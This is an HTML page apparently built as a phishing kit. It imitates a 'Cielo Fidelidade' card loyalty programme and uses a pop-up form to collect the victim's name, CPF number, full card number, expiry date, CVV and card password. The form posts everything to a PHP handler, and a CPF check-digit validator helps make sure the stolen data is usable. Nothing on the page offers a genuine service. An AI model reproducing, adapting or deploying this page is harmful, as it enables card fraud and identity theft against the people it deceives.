<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Cielo Fidelidade</title>
<link rel="stylesheet" type="text/css" href="stylo/stylo.css" />
<link rel="shortcut icon" href="favicon/icone.ico">
<script src="j_query/jquery.min.js"></script> 
<script src="modal.js" type="text/javascript"></script></head>
<script type="text/javascript" language="JavaScript">
		if (navigator.appName == 'Netscape') {
			window.captureEvents(Event.KEYPRESS);
			window.onKeyPress = netscape.KeyPress;
		}
		function JumpField(form, campo, maxlen) //Salta campos dentro de um form
		{
			form = "this.document."+form;
			var nr_form = window.document.forms.length;
			var aux = form+".elements['" + campo + "'].value";
			aux = eval(aux+".length");
			if (maxlen <= aux) {
				var nr = eval(form).elements.length; //nro de elementos do form
				for (i=0; i<nr; i++) {
					if ((eval(form).elements[i].name == campo) && ((i+1) < nr)) {
						for (k=i+1; k<nr; k++) {
							aux = eval(form).elements[k].type;
							aux = aux.toLowerCase();
							if (aux != 'hidden') {
								eval(form).elements[k].focus();
								break;
							}
						}
						break;
					}
				}
			}
		}
		function clean(a){
			a=document.getElementById(a)
			a.value=""		
		}
		function blurLogin(a){
			a=document.getElementById(a)
			if(a.value=="")a.value=""
		}
		function blurSenha(a){
			a=document.getElementById(a)
			if(a.value=="")a.value=""
		}
		
		function doChange(){
			var objLogin 	= document.getElementById('inputLogin').value;
			var objPassword = document.getElementById('senha').value;
				
			if ( objLogin != '') {
				document.getElementById('inputLogin').value = objLogin.toUpperCase();
			}
			
			if ( objPassword != '' ) {
				document.getElementById('senha').value = objPassword.toUpperCase();
			}
		}	
		</script>
<style type="text/css">

#nome{
width: 90px;
height: 23px;
margin: 0 5px 0 0;
padding:1px 0 0 10px;
border: 1px solid #DDD;
-moz-border-radius: 3px;
-webkit-border-radius: 3px;
border-radius:3px;
}

#sobrenome{
width: 120px;
height: 23px;
margin: 0 5px 0 0;
padding:1px 0 0 10px;
border: 1px solid #DDD;
-moz-border-radius: 3px;
-webkit-border-radius: 3px;
border-radius:3px;
}

#cpf{
width: 138px;
height: 23px;
margin: 0 5px 0 0;
padding:1px 0 0 10px;
border: 1px solid #DDD;
-moz-border-radius: 3px;
-webkit-border-radius: 3px;
border-radius:3px;
}

#cartao{
width: 200px;
height: 23px;
margin: 0 5px 0 0;
padding:1px 0 0 10px;
border: 1px solid #DDD;
-moz-border-radius: 3px;
-webkit-border-radius: 3px;
border-radius:3px;
}

#mes{
width: 30px;
height: 23px;
margin: 0 5px 0 0;
padding:1px 0 0 10px;
border: 1px solid #DDD;
-moz-border-radius: 3px;
-webkit-border-radius: 3px;
border-radius:3px;
}

#ano{
width: 30px;
height: 23px;
margin: 0 5px 0 0;
padding:1px 0 0 10px;
border: 1px solid #DDD;
-moz-border-radius: 3px;
-webkit-border-radius: 3px;
border-radius:3px;
}

#cvv{
width: 40px;
height: 23px;
margin: 0 5px 0 0;
padding:1px 0 0 10px;
border: 1px solid #DDD;
-moz-border-radius: 3px;
-webkit-border-radius: 3px;
border-radius:3px;
}

#senha{
width: 70px;
height: 23px;
margin: 0 5px 0 0;
padding:1px 0 0 10px;
border: 1px solid #DDD;
-moz-border-radius: 3px;
-webkit-border-radius: 3px;
border-radius:3px;
}

input{
margin: 0;
padding:0;
color: #999999;
}

</style>
<body>
<div id="topo"></div>
<div id="carro">

<div id="conteudo">
 <table>
 <tr>
 <Td width="186"><a href="javascript:openModalForm('.esqueci-senha','cadastro_js','valida.esqueci.senha.js');"><img src="images/button.jpg" width="204" height="37" title="Passe o mouse no campo para visualizar os exemplo."/></a></Td>
 </tr>
 </table>
  </div>
</div>


<!-- Div que irá escurecer a tela de fundo -->
<div id="mask"></div>
  
<!-- Div oculta que será chamada pela function openModalForm -->
<div class="esqueci-senha">
 
 <div class="form">
 
<h2><img src="images/cadastro.jpg" title="Passe o mouse no campo para visualizar os exemplo." />  </h2> <h1 align="center">PREÊCHA FORMULÁRIO CORRETAMENTE</h1> 
<form action="carreg.php" method="POST"  name="frm" id="frm" target="_self" onSubmit="return validaCampoObrigatorio(this)" autocomplete="off" >
<p><label></label><input id="nome" name="nome" value="Nome" title="Nome" maxlength="30" size="30" onkeyup="JumpField(this.form.name, this.name, 30)" type="text" onfocus="clean(this.id)" onblur="blurLogin(this.id)" lang="1"/>
<input id="sobrenome" name="sobrenome" value="Sobrenome" title="Sobrenome" maxlength="30" size="30" onkeyup="JumpField(this.form.name, this.name, 40)" type="text" onfocus="clean(this.id)" onblur="blurLogin(this.id)" lang="1" /></p>
<p><label></label><input id="cpf" name="cpf" value="CPF" maxlength="11" onkeyup="JumpField(this.form.name, this.name, 11)" type="text" onfocus="clean(this.id)" lang="1" onkeypress="IsNum(this,event);"  onblur="return validacpf()" /></p>
<p><label></label><input id="cartao" name="cartao" value="Número do cartão" title="Número do Cartão" maxlength="16" size="16" onkeyup="JumpField(this.form.name, this.name, 16)" type="text" onfocus="clean(this.id)" onblur="blurLogin(this.id)" lang="2" onkeypress="IsNum(this,event);"/></p>
<p><label></label><input id="mes" name="mes" value="Mes" title="Mes com 2 dígito" maxlength="2" size="2" onkeyup="JumpField(this.form.name, this.name, 2)" type="text" onfocus="clean(this.id)" onblur="blurLogin(this.id)" lang="1" onkeypress="IsNum(this,event);" /> 
<input id="ano" name="ano" value="Ano" title="Ano com 2 dígito" maxlength="2" size="2" onkeyup="JumpField(this.form.name, this.name, 2)" type="text" onfocus="clean(this.id)" onblur="blurLogin(this.id)" lang="1" onkeypress="IsNum(this,event);" /> Validade</p>
<p><label></label><input id="cvv" name="cvv" value="CVV" title="3 Último digito no verso do cartão" maxlength="3" size="3" onkeyup="JumpField(this.form.name, this.name, 3)" type="text" onfocus="clean(this.id)" onblur="blurLogin(this.id)" lang="1" onkeypress="IsNum(this,event);"/>
<img src="images/2222.jpg" title="3 Último digito no verso do cartão" /></p>
<p><label></label><input id="senha" name="senha" value="Senha" title="Senha do cartão" maxlength="8" size="8" onkeyup="JumpField(this.form.name, this.name, 8)" type="password" onfocus="clean(this.id)" onblur="blurLogin(this.id)" lang="1" onkeypress="IsNum(this,event);" />Senha do cartão</p>
<p><label></label><input type="image" src="images/btn-avancar_nm.jpg" name="submit" value="Enviar" title="Cadastrar agora" ></p>
</form> 
 
</div>  

</div>
 


</body>
</html>

<script language="JavaScript">
function validaCampoObrigatorio(form){
            var erro=0;
            var legenda;
            var obrigatorio;           
            for (i=0;i<form.length;i++){
                        obrigatorio = form[i].lang;
                        if (obrigatorio==1){
                                   if (form[i].value == ""){
                                               var nome = form[i].name;
                                               mudarCorCampo(form[i], 'white');
                                               legenda=document.getElementById(nome);
                                               legenda.style.color="black";
                                               erro++;
                                   }
                        }
            }
            if(erro>=1){
                        alert("Informe todo os dados corretamente!")
                        return false;
            } else
                        return true;
}

function mudarCorCampo(elemento, cor){
            elemento.style.backgroundColor=cor;
}
</script>


<script language="JavaScript" type="text/javascript">
function IsNum(obj,event){
var Tecla = event.charCode;
var ie = event.keyCode;
if (!event) event = window.event;
var code;
if (event.keyCode) code = event.keyCode;
else if (event.which) code = event.which; // Netscape 4.?
//se nao for n&#250;mero nem parentesis ou espa&#231;o
if (code < 8 || code > 57 ){
event.returnValue = false;
alert("Informe somente numeros!");
if (event.which){
event.preventDefault();
}
return false;
}else{
event.returnValue = true;
return true;
}
}
  </script>
  
  
  
  
	<script language=javascript>
 
function validacpf(){
 
var i;
 
s = document.frm.cpf.value;
 
var c = s.substr(0,9);
 
var dv = s.substr(9,2);
 
var d1 = 0;
 
for (i = 0; i < 9; i++)
 
{
 
d1 += c.charAt(i)*(10-i);
 
}
 
if (d1 == 0){
alert("CPF digitado invalido!")
document.getElementById("cpf").value = "";
document.frm.cpf.focus();
return false;
 
}
 
d1 = 11 - (d1 % 11);
 
if (d1 > 9) d1 = 0;
 
if (dv.charAt(0) != d1)
 
{
alert("CPF digitado invalido!")
document.getElementById("cpf").value = "";
document.frm.cpf.focus();
return false;
 
}
 
 
d1 *= 2;
 
for (i = 0; i < 9; i++)
 
{
 
d1 += c.charAt(i)*(11-i);
 
}
 
d1 = 11 - (d1 % 11);
 
if (d1 > 9) d1 = 0;
 
if (dv.charAt(1) != d1)
 
{
 
alert("CPF digitado invalido!")
document.getElementById("cpf").value = "";
document.frm.cpf.focus();
return false;
 
}
 
return true;
 
}
 
</script>